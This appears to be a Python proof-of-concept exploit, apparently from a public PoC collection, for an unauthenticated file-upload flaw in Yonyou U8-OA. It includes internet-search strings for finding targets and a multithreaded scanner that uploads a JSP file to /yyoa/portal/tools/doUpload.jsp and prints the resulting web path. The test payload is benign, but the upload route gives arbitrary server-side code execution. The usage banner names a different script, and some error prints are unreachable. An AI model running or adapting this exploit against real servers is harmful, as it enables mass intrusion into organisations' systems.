#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa: title="用友U8-OA"
# zoomeye: app:"yonyou U8"
import ssl
import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings()
if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 YouDianCMS_image_upload_Upload_File_Poc.py url.txt                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8082'
}  
def exp(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75",
        "Host": "%s" %host2,
        "Accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1"
    }
    data ="""--7b1db34fff56ef636e9a5cebcd6c9a75\r\nContent-Disposition: form-data; name="iconFile"; filename="info.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.println("tteesstt1"); %>\r\n--7b1db34fff56ef636e9a5cebcd6c9a75--"""
    vulurl = url + "/yyoa/portal/tools/doUpload.jsp"
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        if  "null" not in r.text and "returnValue" in r.text:
            print(url+"/yyoa/portal/upload/"+r.text[-51:-34])
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])